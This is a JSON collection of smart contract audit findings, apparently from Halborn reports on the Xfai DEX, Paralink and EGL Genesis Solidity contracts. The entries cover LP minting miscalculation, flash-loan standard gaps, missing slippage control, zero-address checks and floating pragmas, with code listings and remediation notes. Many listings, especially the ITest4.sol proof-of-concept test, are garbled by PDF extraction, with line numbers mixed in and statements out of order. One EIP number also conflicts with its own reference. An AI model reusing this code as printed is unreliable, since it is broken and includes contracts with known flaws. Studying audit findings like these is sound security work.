[{"title": "ADDLIQUIDITYETH MISHANDLES DEPOSIT", "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/Xfai_DEX_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf", "body": "The function addLiquidityETH from the XfaiV0Periphery01.sol contract takes ETH received from the user and deposits it into the WETH/XFETH pool. If the pool has liquidity, it computes the amount to deposit of each asset. First, it calculates the proportional amount of ETH sent for the sum of the amounts of each token that the pool has. Then it subtracts the obtained value to the amount of sent ETH to transform it to xfETH. As xfETH tends to increase its value, this calculation can result in a non-optimal deposit, making users obtain less LP tokens than the optimal distribution may achieve. Code Location: Listing 1: xfETH.sol 153 function addLiquidityETH ( 154 address _to , 155 uint _deadline 156 ) external payable override ensure ( _deadline ) returns ( uint  liquidity ) { 157 158 159 160 161 162 163 164 165 address _weth = weth ; // gas saving uint amountETH ; uint amountXfETHtoETH ; address pool = IXfaiFactory ( factory ). getPool ( _weth ); if ( pool == address (0) ) { // create the pool if it doesn 't exist yet pool = IXfaiFactory ( factory ). createPool ( _weth ); } ( uint ETHReserve , uint xfETHReserve ) = IXfaiPool ( pool ).  getStates () ; if ( ETHReserve == 0 && xfETHReserve == 0) { ( amountETH , amountXfETHtoETH ) = ( msg . value / 2 , msg . value / 166 167  2) ; 168 } else { 21 169 amountETH = ( msg . value * ETHReserve ) / ( ETHReserve +  xfETHReserve ); 170 171 172 amountXfETHtoETH = msg . value - amountETH ; } uint amountXfETH = IXFETH ( xfETH ). deposit { value :  amountXfETHtoETH }() ; 173 174 175 176 177 IWETH ( _weth ). deposit { value : amountETH }() ; TransferHelper . safeTransfer ( xfETH , pool , amountXfETH ); TransferHelper . safeTransfer ( _weth , pool , amountETH ); liquidity = IXfaiV0Core ( core ). mint ( _weth , _to ); require ( msg . value == amountETH + amountXfETHtoETH , '  XfaiV0Periphery01 : INSUFFICIENT_AMOUNT '); 178 } Proof Of Concept: The issue resides in the fact that the calculation for the corresponding amount of xfETH is the amount of ETH that will be converted to xfETH. Thus, if the value of xfETH is higher than ether, this amount will decrease when converted to the token system. As the formula for minting LP tokens takes the minimum of the resulting product of the added tokens, the LP tokens minted may be lower than other distributions. The next scenario is used to illustrate the described issue. 1. ETH to Xfeth price has a relation of 3 Eth to 2 xfETH. 2. ETH balance of xfETH contract is 1.5 bigger than the total supply. 3. The WETH/XFETH pool is balanced, with 300 WETH on reserve and 200 xfETH on weight. 4. User deposits 10 ether. 5. The test also computes the LP minted with a different distribution based on the values previous to the original deposit. Listing 2: ITest4.sol 1 pragma solidity ^0.8.19; 2 3 import ' test / Deployer . sol '; 4 22 deal ( address ( this ) , 1000 ether ); // xfaiperiphery . addLiquidityETH { value : 20 ether }( address ( } super . setUp () ; MockWETH weth2 ; function setUp () public override { function test_integration_addLiquidityEth () public { xfactory . createPool ( address ( weth )) ; address pool = xfactory . getPool ( address ( weth )) ; xfeth . deposit { value : 20 ether }() ; weth . deposit { value : 30 ether }() ; xfeth . transfer ( pool , 20 ether ); weth . transfer ( pool , 30 ether ); xfaicore . mint ( address ( weth ) , address ( this )); 5 contract ITest is Deployer { 6 7 8 9 10 11 12 13  this ) , block . timestamp +1000) ; 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28  )); 29  getStates () ; 30 31 32 33  10 ether }( address ( this ) , block . timestamp +1000) ; 34 35 36 37  ); 38 39  / ETHReserve , ( amountXfETHNew * totalSupply ) / xfETHReserve ); 40 41 42 console . log ( ' LPOriginal ', originalLP ); console . log ( ' LPImproved ', liquidityNew ); uint256 newBalance = ( address ( xfeth ). balance * 3) / 2; deal ( address ( xfeth ) , newBalance ); uint256 totalSupply = MockERC20 ( pool ). totalSupply () ; ( uint ETHReserve , uint xfETHReserve ) = IXfaiPool ( pool ). uint amountETHNew = 5 ether ; uint amountXfETHtoETHNew = 10 ether - amountETHNew ; uint amountXfETHNew = xfeth . ETHToXfETH ( amountXfETHtoETHNew uint liquidityNew = Math . min (( amountETHNew * totalSupply ) uint256 originalLP = xfaiperiphery . addLiquidityETH { value : address pool = IXfaiFactory ( xfactory ). getPool ( address ( weth 23 } 43 44 } The next screenshots show the difference between the LP tokens obtained. As it is possible to observe, the difference does exist. BVSS: AO:A/AC:L/AX:L/C:N/I:N/A:N/D:M/Y:L/R:N/S:U (5.6) Recommendation: Consider using a new formula that obtains the optimal distribution. As this may not be an easy task, it can also be a reasonable approach to establish a user defined minimal distribution to perform the calculations. It is also advised to set a minimal LP tokens to be obtained to avoid front-running issues. Remediation Plan: SOLVED: 3ceca61a67a245e4bb7d7774cfbb34e3eec1aeaa. Xfai team solved the The issue on the next commit ID 24 ", "labels": ["Halborn", "Xfai_DEX", "Severity: Medium"]}, {"title": "IMPROVEMENTS FOR FLASH CALLS", "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/Xfai_DEX_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf", "body": "The Xfai Protocol has two different functions to perform flash calls. First one through a flash mint on the Xfeth.sol contract. The second one is a classic flash loan on the XfaiV0Core.sol contract. Although the functions are technically correct from a basic functionality point of view, the standard established on EIP-3165 is not fulfilled. The standard improvements are:  Implement a flashFee view function to compute the fee for a given token amount.  Implement a maxFlashLoan view function to obtain the maximum number of tokens available.  Return true if the execution is successful.  Control the return value of the callback function.  Send the parameters of msg.sender, token, amount, fee and data as inputs to the receiver callback function. Code Location: Listing 3: XFETH.sol (Line 186) 174 function flashMint ( uint _amount ) external override nonReentrant  isPublic { 175 176 177 178 179 180 181 182 183 // get current ETH balance uint ETHBalance = address ( this ). balance ; uint xfETHTotalSupply = totalSupply () ; // compute fee uint fee = ( _amount * flashMintFee ) / 10000; // mint tokens _mint ( msg . sender , _amount ); 25 184 185 186 187 188 189 // hand control to borrower IBorrower ( msg . sender ). executeOnFlashMint ( _amount ); // burn tokens + fee _burn ( msg . sender , _amount + fee ); // reverts if ` msg . sender `  does not have enough tokens to burn 190 191 // double - check that the contract 's ETH balance has not  decreased 192 193 194 195 196 197 198 } assert ( address ( this ). balance >= ETHBalance ); // double - check that the contract 's xfETH supply has decreased assert ( totalSupply () < xfETHTotalSupply ); emit FlashMint ( msg . sender , _amount ); Listing 4: XfaiV0Core.sol (Line 335) 323 function flashLoan ( 324 address _token , 325 uint _amount , 326 address _to , 327 bytes calldata _data 328 ) external override pausable singleLock ( _token ) { 329 330 require ( _to != address (0) , ' XfaiV0Core INVALID_TO '); address pool = XfaiLibrary . poolFor ( _token , factory ,  poolCodeHash ); 331 332 ( uint reserve , ) = IXfaiPool ( pool ). getStates () ; require ( _amount <= reserve , ' XfaiV0Core :  INSUFFICIENT_OUTPUT_AMOUNT '); 333 334 uint balance = IERC20 ( _token ). balanceOf ( pool ); IXfaiPool ( pool ). linkedTransfer ( _token , _to , _amount ); //  optimistically transfer tokens 335 336 337 IXfaiV0FlashLoan ( _to ). flashLoan ( pool , _amount , _data ); require ( IERC20 ( _token ). balanceOf ( pool ) >= balance + (( _amount *  getTotalFee () ) / 10000) , 338 339 340 ' XfaiV0Core : INSUFFICIENT_AMOUNT_RETURNED ' ); IXfaiPool ( pool ). linkedTransfer ( _token , infinityNFT , ( _amount *  infinityNFTFee ) / 10000) ; // send lnft fee to fee collecting  contract 26 341 IXfaiPool ( pool ). update ( IERC20 ( _token ). balanceOf ( pool ) , IERC20 (  xfETH ). balanceOf ( pool )) ; emit FlashLoan ( _to , _amount ); 342 343 } BVSS: AO:A/AC:L/AX:L/C:N/I:N/A:N/D:N/Y:N/R:N/S:U (0.0) Recommendation: From all the previous detailed improvements, consider implementing all of them. Nonetheless, there is one that the Halborn team strongly suggests. These are the parameters specified for the receive callback function. By adding the msg.sender it is ensured that the receiver fallback function executes from trusted origins. Adding the fee avoids the receiver contract to perform any computation or further contract calls to obtain this value. Sending the token address simplifies the logic of the receiver. Finally, the data is absolutely needed to execute the adequate control flow statements on the receiver side. Moreover, consider implementing interfaces following the standard to simplify the usability of the protocol. Reference EIP-3156 Remediation Plan: ACKNOWLEDGED: The Xfai team acknowledged this finding. 27 ", "labels": ["Halborn", "Xfai_DEX", "Severity: Informational"]}, {"title": "ENFORCE XFETH CONSTRUCTOR TO RECEIVE ETH", "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/Xfai_DEX_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf", "body": "The xfEth.solcontract must receive ether on the constructor. The formula used for minting liquidity on the deposit function uses the total supply of xfeth on the numerator of a division to calculate the number of tokens to give in return. If this value is zero, the returned amount will always be zero. Code Location: Listing 5: XFETH.sol 77 constructor ( address _owner , uint _flashMintFee ) payable ERC20 () { 78 79 80 81 82 83 84 } _mint ( address (0) , msg . value ); owner = _owner ; flashMintFee = _flashMintFee ; _status = _NOT_ENTERED ; _name = ' Xfai ETH '; _symbol = ' XFETH '; Listing 6: XFETH.sol 153 function deposit () public payable override nonReentrant returns (  uint amountInXfETH ) { 154 amountInXfETH = ( msg . value * totalSupply () ) / ( address ( this ).  balance - msg . value ); 155 156 157 } _mint ( msg . sender , amountInXfETH ); emit Deposit ( msg . sender , amountInXfETH , msg . value ); 28 BVSS: AO:A/AC:L/AX:L/C:N/I:N/A:N/D:N/Y:N/R:N/S:U (0.0) Recommendation: Consider adding a require statement to enforce the contract to receive ether when deployed. Remediation Plan: ACKNOWLEDGED: The Xfai team acknowledged this finding. 29 ", "labels": ["Halborn", "Xfai_DEX", "Severity: Informational"]}, {"title": "NO SLIPPAGE CONTROL WHEN MINTING XFETH", "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/Xfai_DEX_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf", "body": "The deposit function of xfETH.sol contract allows sending ether and receive xfeth token in return. The nature of this contract allows xfeth value to increase, by reducing the total supply through the fee burned on the flashMint function and remaining the same native token balance. The Xfai DEX is designed to work in optimal conditions, with flashMints being constantly used to take advantage of arbitrage opportunities. It also means, any time an arbitrageur succeeds, all the pools will get unbalanced, starting a virtuous loop of constant profit for all actors in the system. Due to this, it is plausible that a user who attempts to deposit ETH and get Xfeth in return does not obtain the desired amount. Moreover, in certain value ranges, it is possible to send ETH and obtain zero Xfeth in return. So, considering these two scenarios, it is sensible to consider implementing a slippage control of the minimal amount of Xfeth expected on the deposit function. Code Location: Listing 7: xfETH.sol 153 function deposit () public payable override nonReentrant returns (  uint amountInXfETH ) { 154 amountInXfETH = ( msg . value * totalSupply () ) / ( address ( this ).  balance - msg . value ); 155 156 157 } _mint ( msg . sender , amountInXfETH ); emit Deposit ( msg . sender , amountInXfETH , msg . value ); 30 BVSS: AO:A/AC:L/AX:L/C:N/I:N/A:N/D:N/Y:N/R:N/S:U (0.0) Recommendation: Consider adding a parameter variable for the deposit function that allows the user to revert the transaction if the Xfeth returned value is lower than expected. Remediation Plan: ACKNOWLEDGED: The Xfai team acknowledged this finding. 31 ", "labels": ["Halborn", "Xfai_DEX", "Severity: Informational"]}, {"title": "ADDLIQUIDITYETH FUNCTION MAY REVERT ON FIRST DEPOSIT", "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/Xfai_DEX_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf", "body": "The addLiquidityETH function from the XfaiV0Periphery01.sol contract, on the first deposit to the Weth/Xfeth pool, splits the value of ETH sent by the user to use each amount to obtain weth and xfeth. With those obtained amounts at the end of the function, it performs a require statement, where those values are added and need to be equal to the msg.value. The problem of this implementation arises when the first deposit is done with and odd ETH number. In this case, the require statement will revert due to solidity precision loss. Code Location: Listing 8: XfaiV0Periphery01.sol (Lines 177,187) 163 function addLiquidityETH ( 164 address _to , 165 uint _deadline 166 ) external payable override ensure ( _deadline ) returns ( uint  liquidity ) { 167 168 169 170 171 172 173 174 175 address _weth = weth ; // gas saving uint amountETH ; uint amountXfETHtoETH ; address pool = IXfaiFactory ( factory ). getPool ( _weth ); if ( pool == address (0) ) { // create the pool if it doesn 't exist yet pool = IXfaiFactory ( factory ). createPool ( _weth ); } ( uint ETHReserve , uint xfETHReserve ) = IXfaiPool ( pool ).  getStates () ; if ( ETHReserve == 0 && xfETHReserve == 0) { ( amountETH , amountXfETHtoETH ) = ( msg . value / 2 , msg . value / 176 177  2) ; 32 178 179 } else { amountETH = ( msg . value * ETHReserve ) / ( ETHReserve +  xfETHReserve ); 180 181 182 amountXfETHtoETH = msg . value - amountETH ; } uint amountXfETH = IXFETH ( xfETH ). deposit { value :  amountXfETHtoETH }() ; 183 184 185 186 187 IWETH ( _weth ). deposit { value : amountETH }() ; TransferHelper . safeTransfer ( xfETH , pool , amountXfETH ); TransferHelper . safeTransfer ( _weth , pool , amountETH ); liquidity = IXfaiV0Core ( core ). mint ( _weth , _to ); require ( msg . value == amountETH + amountXfETHtoETH , '  XfaiV0Periphery01 : INSUFFICIENT_AMOUNT '); 188 } BVSS: AO:A/AC:L/AX:L/C:N/I:N/A:N/D:N/Y:N/R:N/S:U (0.0) Recommendation: The case of doing a first deposit with an odd number is an edge case. Nevertheless, it is possible to implement a solution for avoiding the possibility to revert on a fair deposit. Remediation Plan: ACKNOWLEDGED: The Xfai team acknowledged this finding. 33 ", "labels": ["Halborn", "Xfai_DEX", "Severity: Informational"]}, {"title": "ABSENCE OF TOKEN OWNERSHIP CHECK IN THE BOOST FUNCTION", "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/Xfai_DEX_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf", "body": "The function boost of the XfaiINFT.sol contract allows increasing the number of shares of a specific NFT token ID, based on the amount of XFIT tokens that the factory has received. However, the function does not check if the caller owns the indicated token ID. This does not represent a security risk, but it can prevent certain unwanted scenarios from the user perspective. Code Location: Listing 9: XfaiINFT.sol (Line 217) 211 function boost ( uint _tokenID ) external override lock returns ( uint  share ) { 212 213 require ( _tokenID <= counter , ' XfaiINFT : Inexistent_ID '); uint amount = IERC20 ( underlyingToken ). balanceOf ( factory ) -  reserve ; require ( amount != 0 , ' XfaiINFT : INSUFICIENT_AMOUNT '); reserve += amount ; share = (1 e18 * amount ) / ( reserve + initialReserve ); INFTShares [ _tokenID ] += share ; totalSharesIssued += share ; emit Boost ( msg . sender , share , _tokenID ); 214 215 216 217 218 219 220 } BVSS: AO:A/AC:L/AX:L/C:N/I:N/A:N/D:N/Y:N/R:N/S:U (0.0) 34 Recommendation: Consider adding a require statement that prevents any user except the owner to increase the shares of the specified NFT. Remediation Plan: ACKNOWLEDGED: The Xfai team acknowledged this finding. 35 ", "labels": ["Halborn", "Xfai_DEX", "Severity: Informational"]}, {"title": "THE PROTOCOL DOES NOT ALLOW TO ADD LIQUIDITY USING XFETH", "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/Xfai_DEX_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf", "body": "The current implementation of Xfai Protocol does not allow to users to The current functions of the protocol provide liquidity using Xfeth. force the user to supply ETH that is transformed into Xfeth. This can be an issue for the users, specially to the ones that already have xfeth minted, in the case of an appreciation of the xfeth token to ETH. BVSS: AO:A/AC:L/AX:L/C:N/I:N/A:N/D:N/Y:N/R:N/S:U (0.0) Recommendation: Consider adding on the XfaiV0Periphery01.sol contract the necessary func- tions to allow adding liquidity with the main token of the protocol. Remediation Plan: PENDING: The Xfai team plans to implement this functionality in the next release. 36 ", "labels": ["Halborn", "Xfai_DEX", "Severity: Informational"]}, {"title": "REMOVING LIQUIDITY CAN REVERT IF TOKEN ORDER IS NOT SET", "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/Xfai_DEX_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf", "body": "The internal _removeLiquidity function of the XfaiV0Periphery01.sol con- These inputs come tract, receives two token addresses as parameters. from the external function removeLiquidity. If none of the inputs tokens address is the WETH contract, the internal function is called, passing directly the input user parameters received. The function then attempts to retrieve the address of the pool corresponding to the token in the first place, however, if the address corresponds to the Xfeth token, the transaction reverts, attempting to call a function of the zero address. Code Location: Listing 10: XfaiV0Periphery01.sol (Lines 200,201) 191 function _removeLiquidity ( 192 address _token0 , 193 address _token1 , 194 uint _liquidity , 195 uint _amount0Min , 196 uint _amount1Min , 197 address _to 198 ) private returns ( uint amount0 , uint amount1 ) { address _core = core ; // gas saving 199 address pool = XfaiLibrary . poolFor ( _token0 , factory , 200  poolCodeHash ); 201 TransferHelper . safeTransferFrom ( pool , msg . sender , _core ,  _liquidity ); 202 ( amount0 , amount1 ) = IXfaiV0Core ( _core ). burn ( _token0 , _token1 ,  _to ); 203 require ( amount0 >= _amount0Min , ' XfaiV0Periphery01 :  INSUFFICIENT_AMOUNT0 '); 204 require ( amount1 >= _amount1Min , ' XfaiV0Periphery01 :  INSUFFICIENT_AMOUNT1 '); 205 } 37 BVSS: AO:A/AC:L/AX:L/C:N/I:N/A:N/D:N/Y:N/R:N/S:U (0.0) Recommendation: Consider controlling the tokens address to avoid unnecessary reverts. Remediation Plan: ACKNOWLEDGED: The Xfai team acknowledged this finding. 38 ", "labels": ["Halborn", "Xfai_DEX", "Severity: Informational"]}, {"title": "REDUNDANT VARIABLE", "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/Xfai_DEX_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf", "body": "Line 363 of the XfaiV0Periphery01.sol contract is not required, as the stored value of the variable is not used. Code Location: Listing 11: XfaiV0Periphery01.sol (Line 363) 346 function swapTokensForExactTokens ( 347 address _to , 348 address _token0 , 349 address _token1 , 350 uint _amount1Out , 351 uint _amount0InMax , 352 uint _deadline 353 ) external override ensure ( _deadline ) returns ( uint amount0In ) { 354 355 356 357 358 359 360 pool0 = XfaiLibrary . poolFor ( _token1 , factory , poolCodeHash ); pool1 = XfaiLibrary . poolFor ( _token1 , factory , poolCodeHash ); ( uint r , uint w) = IXfaiPool ( pool0 ). getStates () ; amount0In = XfaiLibrary . getAmountIn (w , r , _amount1Out , address pool0 ; address pool1 ; if ( _token0 == xfETH ) {  IXfaiV0Core ( core ). getTotalFee () ); 361 362 363 364 365 } else if ( _token1 == xfETH ) { pool0 = XfaiLibrary . poolFor ( _token0 , factory , poolCodeHash ); pool1 = XfaiLibrary . poolFor ( _token0 , factory , poolCodeHash ); ( uint r , uint w) = IXfaiPool ( pool0 ). getStates () ; amount0In = XfaiLibrary . getAmountIn (r , w , _amount1Out ,  IXfaiV0Core ( core ). getTotalFee () ); 366 367 368 369 370 371 372 } else { pool0 = XfaiLibrary . poolFor ( _token0 , factory , poolCodeHash ); pool1 = XfaiLibrary . poolFor ( _token1 , factory , poolCodeHash ); amount0In = XfaiLibrary . getAmountsIn ( pool0 , pool1 , _amount1Out , 39 373 374 375 376 IXfaiV0Core ( core ). getTotalFee () ); } require ( amount0In <= _amount0InMax , ' XfaiV0Periphery01 :  INSUFFICIENT_INPUT_AMOUNT '); 377 TransferHelper . safeTransferFrom ( _token0 , msg . sender , pool0 ,  amount0In ); _swap ( _token0 , _token1 , _to ); 378 379 } BVSS: AO:A/AC:L/AX:L/C:N/I:N/A:N/D:N/Y:N/R:N/S:U (0.0) Recommendation: Consider erasing the unnecessary lines from the code base. Remediation Plan: SOLVED: The Xfai team removed the redundant variable on the next commit ID 3ceca61a67a245e4bb7d7774cfbb34e3eec1aeaa. 40 4.10 (HAL-10) LACK OF UPGRADABILITY PATTERN - INFORMATIONAL (0.0) ", "labels": ["Halborn", "Xfai_DEX", "Severity: Informational"]}, {"title": "3.1 USE OF BLOCK.TIMESTAMP", "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/Paralink_Token_SmartContract_Halborn_Report_v1.pdf", "body": "Block timestamps have historically been used for a variety of applica- tions, such as entropy for random numbers, locking funds for periods of time and various state-changing conditional statements that are time- dependent. Miners have the ability to adjust timestamps slightly which can prove to be quite dangerous if block timestamps are used incorrectly in smart contracts. block.timestamp or its alias now can be manipulated by miners if they have some incentive to do so Code Location: ParaToken.sol Line #121 Recommendation: Avoid relying on block.timestamp 8 ", "labels": ["Halborn", "Paralink_Token_SmartContract_Halborn", "Severity: Informational"]}, {"title": "MythX: 9 THANK YOU FOR CHOOSING", "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/Paralink_Token_SmartContract_Halborn_Report_v1.pdf", "body": "Slither and MythX has been run on all the scoped contracts(ParaToken.sol) MythX: 9 THANK YOU FOR CHOOSING", "labels": ["Halborn", "Paralink_Token_SmartContract_Halborn", "Severity: Informational"]}, {"title": "FLOATING PRAGMA", "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/EGL_Genesis_Smart_Contract_Security_Audit_Halborn_v_1_1.pdf", "body": "EglGenesis.sol contract use the floating pragma ^0.6.0. Contracts should be deployed with the same compiler version and flags that they have been tested with thoroughly. Locking the pragma helps to ensure that contracts do not accidentally get deployed using another pragma, for example, either an outdated pragma version that might introduce bugs that affect the contract system negatively or a recently released pragma version which has not been extensively tested. Reference: ConsenSys Diligence - Lock pragmas Code Location: EglGenesis.sol Line #1 Listing 1: EglGenesis.sol (Lines 1) 1 pragma solidity ^0.6.0;  This is an example where the floating pragma is used. ^0.6.0. Risk Level: Likelihood - 2 Impact - 3 Recommendation: Consider lock the pragma version known bugs for the compiler version. Therefore, it is recommended not to use floating pragma in the production. Apart from just locking the pragma version in the code, the sign (>= ) need to be removed. it is possible locked the pragma fixing the version both in truffle-config.js if you use the Truffle framework and 14 in hardhat.config.js if you use HardHat framework for the deployment. truffle-config.js hardhat.config.js Remediation Plan: SOLVED: EGL Team locked pragma version to 0.6.6. Listing 2: EglGenesis.sol (Lines 1) 1 pragma solidity 0.6.6; 2 3 import \" @openzeppelin / contracts - upgradeable / access / OwnableUpgradeable . sol \" ; 4 import \" @openzeppelin / contracts - upgradeable / proxy / Initializable . sol \" ; 5 import \" @openzeppelin / contracts - upgradeable / utils / PausableUpgradeable . sol \" ; 6 import \" @openzeppelin / contracts - upgradeable / math / SafeMathUpgradeable . sol \" ; 15 ", "labels": ["Halborn", "EGL_Genesis", "Severity: Low"]}, {"title": "MISSING ADDRESS VALIDATION", "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/EGL_Genesis_Smart_Contract_Security_Audit_Halborn_v_1_1.pdf", "body": "In the EglGenesis.sol contract is missing a safety check inside their constructors and multiple functions. Setters of address type parameters should include a zero-address check otherwise contract functionality may become inaccessible or tokens burnt forever. Code Location: EglGenesis.sol Line #~103-112 Listing 3: EglGenesis.sol (Lines 103) 103 104 105 106 107 108 109 110 111 112 function initialize ( address _owner , uint _threshold ) public initializer { __Context_init_unchained () ; __Ownable_init_unchained () ; __Pausable_init_unchained () ; transferOwnership ( _owner ); canContribute = true ; maxThreshold = _threshold ; emit Initialized ( owner () , canContribute , _threshold ); } Risk Level: Likelihood - 2 Impact - 2 Recommendation: Add proper address validation when assigning a value to a variable from user-supplied data. Better yet, address white-listing/black-listing 16 should be implemented in relevant functions if possible. For example: Listing 4: Modifier.sol (Lines 2,3,4) 1 2 3 4 5 modifier validAddress ( address addr ) { require ( addr != address (0) , \" Address cannot be 0 x0 \"); require ( addr != address ( this ) , \" Address cannot be contract \" ); _; } Remediation Plan: SOLVED: EGL Team added address validation on the initialize function. initialize function defined instead of a constructor in the contract. Listing 5: EglGenesis.sol (Lines 2,3) 1 2 3 4 5 6 7 8 9 10 11 12 13 function initialize ( address _owner , uint _threshold ) external initializer { require ( _owner != address (0) , \" GENESIS : INVALID_OWNER \"); require ( _owner != address ( this ) , \" GENESIS : ADDRESS_IS_CONTRACT \"); __Context_init_unchained () ; __Ownable_init_unchained () ; __Pausable_init_unchained () ; transferOwnership ( _owner ); canContribute = true ; maxThreshold = _threshold ; emit Initialized ( owner () , canContribute , _threshold ); } 17 ", "labels": ["Halborn", "EGL_Genesis", "Severity: Low"]}, {"title": "MISSING CALCULATION ON THE CONTRIBUTORS COUNT", "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/EGL_Genesis_Smart_Contract_Security_Audit_Halborn_v_1_1.pdf", "body": "During the phase of EglGenesis.sol contract, the user can withdraw con- tribution. The contract is applied multiple calculations and controls on the related functions. But, contributorsCount is not decreased when the user withdraw funds. Code Location: EglGenesis.sol Line #~117 Listing 6: EglGenesis.sol (Lines ) 117 118 119 120 121 122 123 124 125 126 127 128 129 130 131 function withdraw () public whenNotPaused { require ( canWithdraw , \" GENESIS : WITHDRAW_NOT_ALLOWED \" ); require ( contributors [ msg . sender ]. amount > 0, \" GENESIS : NOT_CONTRIBUTED \" ); uint amountToWithdraw = contributors [ msg . sender ]. amount ; uint contributorIdx = contributors [ msg . sender ]. idx ; delete contributors [ msg . sender ]; delete contributorsList [ contributorIdx - 1]; cumulativeBalance = cumulativeBalance . sub ( amountToWithdraw ); ( bool success , ) = msg . sender . call { value : amountToWithdraw }( \" \"); require ( success , \" GENESIS : WITHDRAW_FAILED \"); emit ContributionWithdrawn ( msg . sender , amountToWithdraw , now ); } 18 Risk Level: Likelihood - 2 Impact - 2 Recommendation: Add proper calculation on the contributorsCount variable. According to workflow, EGL can continue without substraction operation. Listing 7: Example Remediation (Lines 9) function withdraw () public whenNotPaused { require ( canWithdraw , \" GENESIS : WITHDRAW_NOT_ALLOWED \" ); require ( contributors [ msg . sender ]. amount > 0, \" GENESIS : NOT_CONTRIBUTED \" ); uint amountToWithdraw = contributors [ msg . sender ]. amount ; uint contributorIdx = contributors [ msg . sender ]. idx ; delete contributors [ msg . sender ]; delete contributorsList [ contributorIdx - 1]; contributorsCount = contributorsCount . sub (1) ; cumulativeBalance = cumulativeBalance . sub ( amountToWithdraw ); ( bool success , ) = msg . sender . call { value : amountToWithdraw }( \" \"); require ( success , \" GENESIS : WITHDRAW_FAILED \"); emit ContributionWithdrawn ( msg . sender , amountToWithdraw , now ); } 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 Remediation Plan: SOLVED: The main purpose of the the contributorsCount variable is in combination with the contributorsList array. According to workflow, the variable name is changed with absoluteMaxContributorsCount. 19 ", "labels": ["Halborn", "EGL_Genesis", "Severity: Low"]}, {"title": "ALLOW WITHDRAW PROGRESS WITHOUT FUNDS", "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/EGL_Genesis_Smart_Contract_Security_Audit_Halborn_v_1_1.pdf", "body": "During the phase of EglGenesis.sol contract, only the owner can allow withdraw progress. But, without funds the owner can allow withdraw phase. Code Location: EglGenesis.sol Line #~117 Listing 8: EglGenesis.sol (Lines ) 135 136 137 138 139 140 141 function allowWithdraw () public onlyOwner whenNotPaused { require ( cumulativeBalance < maxThreshold , \" GENESIS : MAX_THRESHOLD_REACHED \" ); require ( canContribute , \" GENESIS : GENESIS_ENDED \" ); canWithdraw = true ; canContribute = false ; emit WithdAllowed ( msg . sender , now ); } Risk Level: Likelihood - 2 Impact - 2 Recommendation: It is recommend to validate allowWithdraw function should not be called without funds. Listing 9: EglGenesis.sol (Lines 2) 2 3 function allowWithdraw () public onlyOwner whenNotPaused { require ( cumulativeBalance > 0, \" GENESIS : NO BALANCE \" ); 20 4 5 6 7 8 9 } require ( cumulativeBalance < maxThreshold , \" GENESIS : MAX_THRESHOLD_REACHED \" ); require ( canContribute , \" GENESIS : GENESIS_ENDED \" ); canWithdraw = true ; canContribute = false ; emit WithdAllowed ( msg . sender , now ); Remediation Plan: SOLVED: The cumulative balance check has been added into the allowWithdraw function. Listing 10: Fix (Lines ) 1 require ( cumulativeBalance > 0, \" GENESIS : NO_BALANCE \" ); 21 ", "labels": ["Halborn", "EGL_Genesis", "Severity: Low"]}, {"title": "OWNER CAN RENOUNCE OWNERSHIP", "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/EGL_Genesis_Smart_Contract_Security_Audit_Halborn_v_1_1.pdf", "body": "The Owner of the contract is usually the account which deploys the contract. As a result, the Owner is able to perform some privileged actions. In the EglGenesis.sol smart contracts, the renounceOwnership function is used to renounce being Owner. Otherwise, if the ownership was not transferred before, the contract will never have an Owner, which is dangerous. Function: Risk Level: Likelihood - 1 Impact - 1 22 Recommendation: Its recommended that the Owner is not able to call renounceOwnership without transferring the Ownership to other address before. In addition, if a multi-signature wallet is used, calling renounceOwnership function should be confirmed for two or more users. As an other solution, Renounce Ownership functionality can be disabled with the following line. For example: Listing 11: Modifier.sol (Lines 3) 2 3 4 function renounceOwnership () public override onlyOwner { revert ( \" can 't renounceOwnership here \" ); // not possible with this smart contract } Remediation Plan: SOLVED: The contract will not allow owner to renounce ownership. Only transferOwnership function permitted. Listing 12: Fix (Lines ) 1 2 3 function renounceOwnership () public override onlyOwner { revert ( \" GENESIS : NO_RENOUNCE_OWNERSHIP \" ); } 23 ", "labels": ["Halborn", "EGL_Genesis", "Severity: Informational"]}, {"title": "MISSING VALIDATION ON THE FUNCTION", "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/EGL_Genesis_Smart_Contract_Security_Audit_Halborn_v_1_1.pdf", "body": "According to workflow, The owner of the contract can finish genesis progress. In the related function, require(canContribute, \"GENESIS: GENESIS_ENDED\"); statement is missing. Code Location: EglGenesis.sol Line #~146 Listing 13: EglGenesis.sol (Lines ) 146 147 148 149 150 151 function endGenesis () public onlyOwner whenNotPaused { canContribute = false ; ( bool success , ) = msg . sender . call { value : cumulativeBalance }( \"\" ); require ( success , \" GENESIS : CLOSE_FAILED \" ); emit GenesisEnded ( msg . sender , cumulativeBalance , address ( this ). 